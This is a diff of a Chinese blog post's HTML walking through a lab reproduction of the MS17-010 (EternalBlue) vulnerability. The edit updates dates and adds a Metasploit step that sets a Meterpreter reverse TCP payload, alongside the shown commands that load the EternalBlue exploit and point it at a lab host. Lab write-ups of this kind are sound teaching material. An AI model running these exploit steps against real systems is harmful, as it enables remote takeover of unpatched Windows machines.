@@ -103,7 +103,7 @@
 <meta property="og:image" content="https://cjjkkk.github.io/image/ms17-010/mete4.jpg">
 <meta property="og:image" content="https://cjjkkk.github.io/image/ms17-010/rdesktop.jpg">
 <meta property="og:image" content="https://cjjkkk.github.io/image/ms17-010/rdesktop2.jpg">
-<meta property="og:updated_time" content="2019-04-03T12:13:34.602Z">
+<meta property="og:updated_time" content="2019-06-09T14:45:35.798Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ms17-010（永恒之蓝）漏洞复现">
 <meta name="twitter:description" content="前言 复现准备 复现过程 后记    一.前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚">
@@ -385,7 +385,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  849
+                  858
                 </span>
               
 
@@ -435,7 +435,7 @@
 <p><img src="\image\ms17-010\nmap2.jpg" alt="nmap1"></p>
 <h3 id="2-使用Metasploit对目标进行监听"><a href="#2-使用Metasploit对目标进行监听" class="headerlink" title="2.使用Metasploit对目标进行监听"></a>2.使用Metasploit对目标进行监听</h3><p>输入<code>msfconsole</code>启动Metasploit<br>在Metasploit中，输入<code>search ms17-010</code>查找永恒之蓝漏洞</p>
 <p><img src="\image\ms17-010\mete.png" alt="mete"></p>
-<p>输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>执行漏洞<br>输入<code>show options</code>查看当前攻击配置</p>
+<p>输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>执行漏洞<br>输入<code>set payload windows/x64/meterpreter/reverse_tcp</code>执行payload<br>输入<code>show options</code>查看当前攻击配置</p>
 <p><img src="\image\ms17-010\mete1.jpg" alt="mete1"></p>
 <p>将配置中第一行的<code>RHOST</code>修改为靶机IP地址<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 192.168.28.128</span><br></pre></td></tr></table></figure></p>
 <p>再次查看配置</p>
@@ -483,7 +483,7 @@
   <p><span>本文标题:</span><a href="/ms17-010复现/">ms17-010（永恒之蓝）漏洞复现</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Jacky Cheng 的个人博客">Jacky Cheng</a></p>
   <p><span>发布时间:</span>2019年03月16日 - 16:03</p>
-  <p><span>最后更新:</span>2019年04月03日 - 20:04</p>
+  <p><span>最后更新:</span>2019年06月09日 - 22:06</p>
   <p><span>原始链接:</span><a href="/ms17-010复现/" title="ms17-010（永恒之蓝）漏洞复现">https://cjjkkk.github.io/ms17-010复现/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://cjjkkk.github.io/ms17-010复现/" aria-label="复制成功！"></i></span>
   </p>
